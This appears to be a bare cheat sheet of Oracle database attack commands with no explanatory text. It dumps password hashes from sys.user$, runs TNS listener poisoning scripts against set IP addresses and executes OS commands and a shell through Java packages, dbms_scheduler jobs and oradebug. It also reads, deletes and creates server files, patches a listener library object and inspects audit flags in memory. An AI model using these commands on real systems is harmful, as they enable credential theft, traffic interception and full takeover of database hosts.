select name,password from sys.user$ where type#=1;

select name,password from sys.user$ where name=’SYS’;

select dbms_metadata.get_ddl('USER','SYS') from dual;

select distinct a.name from sys.user$ a, sys.sysauth$ b where
a.user#=b.grantee# and b.privilege#=4;


-bash-4.2$python async.py –-local-ip 192.168.174.130 –-local-port 1521 --remote-ip 192.168.174.32 –remote-port 1521
-bash-4.2$python async.py –-local-ip 192.168.174.130 –-local-port 1521 --remote-ip 192.168.174.32 –remote-port 1521
-bash-4.2$python poison.py 192.168.174.130 1521 orcl 

SQL>  select comp_name, version from dba_registry where comp_name like '%JAVA%';
SQL> select os_command.exec_clob('ls -la /') directory_listing from dual;
SQL> select OS_COMMAND.GET_SHELL shell from dual;
SQL> select os_command.exec_clob('/bin/ps -ef') from dual ;
SQL> select file_pkg.get_file('/home/oracle/text.txt') file_exists from dual;
SQL> select file_pkg.get_file('/home/oracle/text.txt'). delete_file() file_not_exists from duaL;
SQL> select file_pkg.get_file('/home/oracle/new_file.txt') file_not_exists from duaL;
SQL> select file_pkg.get_file('/home/oracle/create_new_file.txt'). make_file () file_exists from dual;


-bash-4.2$ ar -x libntcp12.a sntt.o
-bash-4.2$ cp sntt.o sntt.o.bkp
-bash-4.2$ python async.py sntt.o
-bash-4.2$ ar -r libntcp12.a sntt.o



BEGIN
dbms_scheduler.create_job(job_name => 'TEST',
job_type => 'executable',
job_action => '/home/oracle/batch.sh',
enabled => TRUE,
auto_drop => TRUE);
END;
/


exec dbms_scheduler.run_job('TEST');

BEGIN
SYS.DBMS_SCHEDULER.CREATE_JOB ( 
job_name => 'WINDOWS_job',
job_type => 'EXECUTABLE',
job_action => 'C:\WINDOWS\system32\cmd.exe',
auto_drop => TRUE,
enabled => TRUE);

SQL> select fsv.KSMFSNAM,sga.* from x$ksmfsv fsv, x$ksmmem sga where sga.addr=fsv.KSMFSADR and fsv.ksmfsnam like ‘kzaflg_%’;
SQL> oradebug call system 'ls -la >/home/oracle/test.txt'

